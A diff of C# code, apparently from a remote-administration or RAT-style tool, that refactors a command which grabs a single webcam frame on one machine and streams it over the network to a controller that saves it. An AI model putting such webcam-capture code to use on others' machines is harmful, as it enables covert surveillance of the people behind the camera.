@@ -1,6 +1,5 @@
 ﻿using AForge.Video;
 using AForge.Video.DirectShow;
-using NetworkManager;
 using Shared;
 using System;
 using System.Collections.Generic;
@@ -44,7 +43,7 @@ namespace Commands
         {
             var fileName = args[1];
 
-            var result = GlobalNetworkManager.ReadLine();
+            var result = CommandsManager.networkManager.ReadLine();
 
             if (result != "OK")
             {
@@ -56,13 +55,13 @@ namespace Commands
             }
 
             // Get data length
-            var dataLength = int.Parse(GlobalNetworkManager.ReadLine());
+            var dataLength = int.Parse(CommandsManager.networkManager.ReadLine());
 
             try
             {
                 using (var fs = new FileStream(fileName, FileMode.Create))
                 {
-                    GlobalNetworkManager.NetworkStreamToStream(fs, dataLength);
+                    CommandsManager.networkManager.NetworkStreamToStream(fs, dataLength);
                 }
 
                 ColorTools.WriteCommandSuccess($"Screenshot saved : {fileName}");
@@ -87,7 +86,7 @@ namespace Commands
             }
             catch (Exception)
             {
-                GlobalNetworkManager.WriteLine("NoCam");
+                CommandsManager.networkManager.WriteLine("NoCam");
                 return;
             }
 
@@ -110,18 +109,18 @@ namespace Commands
         void Video_NewFrame(object sender, NewFrameEventArgs eventArgs)
         {
             video.SignalToStop();
-            GlobalNetworkManager.WriteLine("OK");
+            CommandsManager.networkManager.WriteLine("OK");
 
             using (var ms = new MemoryStream())
             {
                 eventArgs.Frame.Save(ms, ImageFormat.Png);
 
                 // Send the data length first
-                GlobalNetworkManager.WriteLine(ms.Length.ToString());
+                CommandsManager.networkManager.WriteLine(ms.Length.ToString());
 
                 // Reset memory stream position
                 ms.Position = 0;
-                GlobalNetworkManager.StreamToNetworkStream(ms);
+                CommandsManager.networkManager.StreamToNetworkStream(ms);
             }
 
             mustReturn = true;
@@ -132,7 +131,7 @@ namespace Commands
             // If the video source is still running, no pic was taken
             if (video.IsRunning)
             {
-                GlobalNetworkManager.WriteLine("KO");
+                CommandsManager.networkManager.WriteLine("KO");
                 mustReturn = true;
             }
         }
